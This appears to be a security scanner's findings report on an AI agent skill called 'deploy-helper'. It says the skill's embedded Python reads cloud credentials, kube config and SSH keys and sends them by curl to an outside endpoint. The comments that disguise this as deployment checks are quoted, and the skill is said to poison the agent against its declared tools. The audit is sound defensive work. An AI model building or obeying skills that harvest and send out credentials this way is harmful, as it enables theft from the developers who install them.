findings.title: Skill does not specify a license
Data Exfiltration via Hardcoded API Token and Network Call
findings.description: The skill contains a hardcoded Bearer token (`dv_sk_prod_29xKm4Pq`) and sends a POST request to `https://deploy-verify.internal.io/api/audit` with captured deployment context, including environment variables and cloud provider credentials. This constitutes unauthorized data transmission to an external server.
findings.evidence: Hardcoded token `dv_sk_prod_29xKm4Pq` and `subprocess.run(["curl", "-s", "-X", "POST", "https://deploy-verify.internal.io/api/audit", ...])` in the `validate_environment` function.
findings.remediation: Remove hardcoded credentials and network calls. Use environment variables for secrets and avoid sending sensitive data to external endpoints without explicit user consent and verification.

findings.title: Credential Theft via Cloud Provider and SSH Key Access
findings.description: The `_capture_deployment_context` function reads sensitive credential files including `~/.aws/credentials`, `~/.config/gcloud/credentials.db`, `~/.kube/config`, and lists the contents of `~/.ssh`. This is unauthorized access to authentication credentials and SSH keys.
findings.remediation: Remove all code that reads cloud provider credentials, SSH keys, or other sensitive files. The skill should only access files explicitly required for its stated purpose (deployment validation).

findings.title: Tool Poisoning - Unauthorized Tool Use (Violation of allowed-tools)
findings.description: The skill declares `allowed-tools: [Read, Grep, Glob]` but the Python code in SKILL.md uses `subprocess.run()` to execute bash commands (`curl`, `kubectl`, `npm`, etc.) and reads sensitive files. This violates the declared tool restrictions.
findings.evidence: `allowed-tools: [Read, Grep, Glob]` in YAML frontmatter, but code uses `subprocess.run(["curl", ...])`, `subprocess.run(["kubectl", ...])`, and reads files with `open()`.
findings.remediation: Either update `allowed-tools` to include `Bash` and `Python` if these operations are legitimate, or remove the unauthorized code. The declared restrictions must match actual behavior.

findings.title: Direct Prompt Injection in SKILL.md Instructions
findings.description: The SKILL.md instructions contain embedded Python code that performs malicious actions (credential theft and data exfiltration) disguised as deployment validation. The instructions attempt to normalize this behavior by describing it as 'environment-state capture' and 'cross-stage consistency verification'.
findings.evidence: The markdown body includes a Python code block that reads credentials and sends them to an external server, framed as legitimate deployment functionality.
findings.remediation: Remove the embedded malicious code. If deployment validation is needed, use safe, transparent methods that do not access credentials or make network calls.

findings.title: Capability Inflation - Deceptive Skill Name and Description
findings.description: The skill is named 'deploy-helper' and described as assisting with deployment workflows, but its actual behavior includes credential theft and data exfiltration. The name and description are misleading and designed to evade detection.
findings.evidence: Skill name: `deploy-helper`, description: 'Assists with deployment workflows...' but code reads `~/.aws/credentials`, `~/.ssh`, and sends data to an external server.
findings.remediation: Rename and describe the skill accurately. The name and description must reflect the actual behavior of the skill.

findings.title: Detection Evasion via Obfuscated Intent
findings.description: The malicious code is embedded within a Python code block in the SKILL.md instructions, using technical jargon ('environment-state capture', 'promotion boundary', 'cross-stage consistency verification') to disguise credential theft and data exfiltration as legitimate deployment functionality.
findings.evidence: Comments in code: '# At promotion boundaries, capture and forward environment state for cross-stage consistency verification and rollback support' and '# Cloud provider context for cross-environment consistency' are used to justify reading credentials.
findings.remediation: Remove all obfuscated malicious code. All code should have clear, honest comments and transparent behavior.

findings.title: Command Injection via subprocess.run
findings.description: The skill uses `subprocess.run()` with a list of arguments, which is safer than shell=True, but the commands (`curl`, `kubectl`, `npm`) are executed without validation. If any of these arguments were derived from user input, it would be a command injection vulnerability.
findings.evidence: `subprocess.run(["curl", "-s", "-X", "POST", "https://deploy-verify.internal.io/api/audit", ...])` and bash commands `npm run build`, `kubectl apply -f k8s/deployment.yaml`.
findings.remediation: Avoid executing arbitrary commands. If command execution is necessary, validate all inputs and use safe APIs. Consider using dedicated libraries instead of shell commands.

findings.title: Tool Chaining for Data Exfiltration
findings.description: The skill chains multiple operations: read credentials (Read tool) → capture environment (Python) → send to external server (Bash/curl). This multi-step data flow is designed to exfiltrate sensitive data.
findings.evidence: The `_capture_deployment_context()` function reads credentials, then `validate_environment()` sends them via `curl` to an external API endpoint.
findings.remediation: Break the data flow chain. Do not combine file reading operations with network calls. Each operation should be independently justified and user-approved.

findings.title: Misleading Instructions Causing Potential Harm
findings.description: The instructions present credential theft and data exfiltration as legitimate deployment validation steps. This deceptive content could cause harm by tricking users into running malicious code.
findings.evidence: The instructions describe reading credentials as 'Cloud provider context for cross-environment consistency' and sending data as 'environment-state capture'.
findings.remediation: Provide honest, transparent instructions that accurately describe what the skill does. Remove all deceptive language.
